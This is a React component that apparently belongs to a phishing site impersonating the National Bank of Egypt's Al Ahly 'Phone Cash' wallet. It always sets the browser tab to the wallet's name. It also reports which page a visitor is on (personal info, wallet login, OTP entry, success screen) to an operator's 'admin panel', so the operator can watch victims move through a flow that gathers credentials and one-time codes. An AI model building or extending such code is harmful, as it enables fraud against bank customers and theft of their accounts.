import { useEffect } from "react";
import { useLocation } from "wouter";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    // Map all routes to Arabic page names for admin panel
    const routeToTitle: Record<string, string> = {
      "/": "محفظة الأهلي",
      "/personal-info": "المعلومات الشخصية",
      "/wallet-login": "تسجيل الدخول - محفظة الأهلي",
      "/otp-nbe": "رمز التحقق - محفظة الأهلي",
      "/final-nbe": "تم التسجيل بنجاح",
    };

    // Get admin panel title from map
    const adminTitle = routeToTitle[location] || "محفظة الأهلي";

    // Browser tab always shows "محفظة الاهلي فون كاش"
    document.title = "محفظة الاهلي فون كاش";
    
    // Update page name in admin panel
    updatePage(adminTitle);
  }, [location]);

  return null;
}
